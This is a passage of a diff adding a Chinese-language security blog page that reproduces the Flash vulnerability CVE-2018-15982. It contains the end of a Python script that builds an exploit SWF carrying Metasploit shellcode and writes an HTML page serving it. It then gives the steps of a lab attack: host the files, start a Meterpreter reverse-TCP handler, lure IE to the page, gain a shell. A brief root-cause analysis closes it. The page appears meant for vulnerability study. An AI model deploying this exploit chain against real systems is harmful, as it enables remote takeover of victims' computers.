+	<span class="k">if</span> <span class="n">binary_data_len</span> <span class="o">&gt;=</span> <span class="mh">0x3F</span><span class="p">:</span>
+		<span class="n">length_32</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">'I'</span><span class="p">,</span> <span class="n">binary_data_len</span> <span class="o">+</span> <span class="mi">6</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)</span>
+	<span class="k">else</span><span class="p">:</span>
+		<span class="n">tag_code_and_length_16</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">'h'</span><span class="p">,</span> <span class="p">(</span><span class="mh">0x57</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">|</span> <span class="n">binary_data_len</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)</span>
+	<span class="k">return</span> <span class="n">tag_code_and_length_16</span> <span class="o">+</span> <span class="n">length_32</span> <span class="o">+</span> <span class="n">data_id_16</span> <span class="o">+</span> <span class="n">reserved_32</span>
+	
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+	<span class="k">print</span> <span class="n">LOGO</span>
+	<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">"exp for CVE-2018-15982"</span><span class="p">)</span>
+	<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span>
+			<span class="s">"-i"</span><span class="p">,</span> <span class="s">"--bin"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Input MSF x86 shellcode.bin"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+	<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span>
+			<span class="s">"-I"</span><span class="p">,</span> <span class="s">"--sbin"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Input MSF x64 shellcode.bin"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+	<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span>
+		<span class="s">'-o'</span><span class="p">,</span> <span class="s">"--output"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Output exploit swf and index.html"</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s">"exploit.swf"</span><span class="p">,</span><span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+	<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
+	<span class="n">genexp</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="nb">bin</span><span class="p">,</span><span class="n">args</span><span class="p">.</span><span class="n">sbin</span><span class="p">,</span><span class="n">args</span><span class="p">.</span><span class="n">output</span><span class="p">)</span>
+	<span class="n">html</span> <span class="o">=</span> <span class="s">"""
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+	&lt;meta charset="utf-8"/&gt;
+	&lt;title&gt;CVE-2018-15982 Exploit&lt;/title&gt;
+	&lt;meta name="description" content="" /&gt;
+	&lt;style&gt;
+		html, body { height:100%; overflow:hidden; }
+		body { margin:0; }
+	&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+	&lt;div id="altContent"&gt;
+		&lt;h1&gt;CVE-2018-15982(Flash Exploit)&lt;/h1&gt;
+	&lt;/div&gt;
+	"""</span> <span class="o">+</span> <span class="s">"&lt;embed src=</span><span class="se">\"</span><span class="s">"</span> <span class="o">+</span> <span class="n">args</span><span class="p">.</span><span class="n">output</span> <span class="o">+</span>  <span class="s">"</span><span class="se">\"</span><span class="s">&gt;&lt;/embed&gt;"</span> <span class="o">+</span> <span class="s">"""
+&lt;/body&gt;
+&lt;/html&gt;
+"""</span>
+	<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"index.html"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span>
+	<span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">html</span><span class="p">)</span>
+	<span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+	<span class="k">print</span> <span class="s">"[*] Done ! output file --&gt; "</span> <span class="o">+</span> <span class="n">args</span><span class="p">.</span><span class="n">output</span>
+	<span class="k">print</span> <span class="s">"[*] Done ! output file --&gt; index.html"</span>
+</code></pre></div></div>
+
+<ul>
+  <li>利用Python的SimpleHTTPServer模块开启一个简单的服务器，命令为：<code class="language-plaintext highlighter-rouge">python -m SimpleHTTPServer 8110</code></li>
+</ul>
+
+<p><img src="/assets/images/md/vul/Snipaste_05_13-34-18.png" alt="" /></p>
+
+<ul>
+  <li>在Kali终端中输入以下命令来开启监听</li>
+</ul>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use ecploit/multi/handler
+<span class="nb">set </span>payload windows/meterpreter/reverse_tcp_rc4
+<span class="nb">set </span>RC4PASSWORD yourPWD
+<span class="nb">set </span>LHOST 192.168.40.128
+<span class="nb">set </span>LPORT 5002
+exploit
+</code></pre></div></div>
+
+<p><img src="/assets/images/md/vul/Snipaste_05_13-36-13.png" alt="" /></p>
+
+<ul>
+  <li>
+    <p>在windows中打开IE浏览器访问服务器http://192.168.40.128:8110</p>
+  </li>
+  <li>
+    <p>几秒钟后Kali监听到会话</p>
+  </li>
+</ul>
+
+<p><img src="/assets/images/md/vul/Snipaste_05_13-37-08.png" alt="" /></p>
+
+<ul>
+  <li>在msf中输入shell拿到shell</li>
+</ul>
+
+<p><img src="/assets/images/md/vul/Snipaste_05_13-37-34.png" alt="" /></p>
+
+<ul>
+  <li>接下来就可以执行各种命令了，如ipconfig或者弹计算器（。</li>
+</ul>
+
+<p><img src="/assets/images/md/vul/Snipaste_05_13-38-13.png" alt="" /></p>
+
+<h2 id="危害分析">危害分析</h2>
+
+<p>该漏洞位于TVSDK内Metadata类的setObject函数，setObject在将String类型（属于RCObject）对象保存到Metadata类对象的keySet成员时，没有使用DRCWB（Deferred ReferenceCounted, with Write Barrier）。攻击者利用这一点，通过强制GC获得一个悬垂指针，在此基础上通过多次UAF进行多次类型混淆，随后借助两个自定义类的交互操作实现任意地址读写，在此基础上泄露ByteArray的虚表指针，从而绕过ASLR，最后借助HackingTeam泄露代码中的方式绕过DEP/CFG，执行shellcode。属于0day漏洞，危害性极高。</p>
+
+  </div>
+
+  
+  
+<script src="https://utteranc.es/client.js"
+        repo=""
+        issue-term="issue-term"
+        label="utteranc"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+
+
+  
+</article>
+
+<div class="pagination">
+  
+    <span class="prev" >
+      <a href="/cnnvd-201904-742/">
+        ← 上一篇
+      </a>
+    </span>
+  
+  
+    <span class="next" >
+      <a href="/python-re/">
+        下一篇 →
+      </a>
+    </span>
+  
+</div>
+      </div>
+    </div>
+
+    
+
+  </body>
+
+  
+  <script>
+    document.getElementById("main").classList.add("withtoc");
+  </script>
+  
+
+  <div class="wrapper-footer-mobile">
+    <footer class="footer">
+      <!-- Refer to https://codepen.io/ruandre/pen/howFi -->
+<ul class="svg-icon">
+
+  
+  
+  
+
+  
+
+  
+  <li><a href="mailto:hiter_sun@163.com" class="icon-8 email" title="Email"><svg viewBox="0 0 512 512"><path d="M502.3 190.8c3.9-3.1 9.7-.2 9.7 4.7V400c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V195.6c0-5 5.7-7.8 9.7-4.7 22.4 17.4 52.1 39.5 154.1 113.6 21.1 15.4 56.7 47.8 92.2 47.6 35.7.3 72-32.8 92.3-47.6 102-74.1 131.6-96.3 154-113.7zM256 320c23.2.4 56.6-29.2 73.4-41.4 132.7-96.3 142.8-104.7 173.4-128.7 5.8-4.5 9.2-11.5 9.2-18.9v-19c0-26.5-21.5-48-48-48H48C21.5 64 0 85.5 0 112v19c0 7.4 3.4 14.3 9.2 18.9 30.6 23.9 40.7 32.4 173.4 128.7 16.8 12.2 50.2 41.8 73.4 41.4z"/></svg><!--[if lt IE 9]><em>Email</em><![endif]--></a></li>
+  
+
+  
+
+  
+
+  
+  <li><a href="https://github.com/suniven" class="icon-13 github" title="GitHub"><svg viewBox="0 0 512 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg><!--[if lt IE 9]><em>GitHub</em><![endif]--></a></li>
+  
+
+  
+
+  
+
+  
+
+  
+  <li><a href="/feed.xml" class="icon-21 rss" title="RSS"><svg viewBox="0 0 512 512"><path d="M400 32H48C21.49 32 0 53.49 0 80v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V80c0-26.51-21.49-48-48-48zM112 416c-26.51 0-48-21.49-48-48s21.49-48 48-48 48 21.49 48 48-21.49 48-48 48zm157.533 0h-34.335c-6.011 0-11.051-4.636-11.442-10.634-5.214-80.05-69.243-143.92-149.123-149.123-5.997-.39-10.633-5.431-10.633-11.441v-34.335c0-6.535 5.468-11.777 11.994-11.425 110.546 5.974 198.997 94.536 204.964 204.964.352 6.526-4.89 11.994-11.425 11.994zm103.027 0h-34.334c-6.161 0-11.175-4.882-11.427-11.038-5.598-136.535-115.204-246.161-251.76-251.76C68.882 152.949 64 147.935 64 141.774V107.44c0-6.454 5.338-11.664 11.787-11.432 167.83 6.025 302.21 141.191 308.205 308.205.232 6.449-4.978 11.787-11.432 11.787z"/></svg><!--[if lt IE 9]><em>RSS</em><![endif]--></a></li>
+  
+
+  
+
+  
+
+  
+
+  
+
+</ul>
+
+
+
+<p>Copyright (c) 2019-2021 From Gotei13 12th Div.</p>
+
+    </footer>
+
+
+</html>
